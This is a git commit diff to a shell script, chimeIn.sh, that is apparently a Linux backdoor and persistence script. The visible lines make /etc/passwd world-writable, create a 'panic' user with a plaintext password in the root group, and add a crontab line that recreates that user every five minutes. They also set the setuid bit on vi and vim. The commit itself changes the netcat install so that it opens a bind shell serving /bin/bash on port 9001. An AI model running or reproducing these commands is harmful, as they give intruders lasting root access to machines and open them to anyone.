9d49ec2a5edec3c73197454811b8effb5b6043b6
Kole Swesey <45017744+kernelpanicatthedisco@users.noreply.github.com>
2019-11-18 10:27:52 -0600

    Update chimeIn.sh
    fixed netcat

--- chimeIn.sh
+++ chimeIn.sh
@@ -4,8 +4,8 @@ chmod 666 /etc/passwd
 useradd panic -p iwrites1ns
 usermod -a -G root panic
 echo "\*/5 \* \* \* \*  root  useradd panic -p iwrites1ns && usermod -a -G root panic" >> /etc/crontab
-apt -y install nc || yum -y install nc
-nc -lvp 9001 /bin/bash &
+apt -y install netcat-traditional || yum -y install netcat-traditional
+nc.traditional -l -p 9001 -e /bin/bash &
 chmod u+s `which vi`
 chmod u+s `which vim`
 echo "Oh, well in fact"
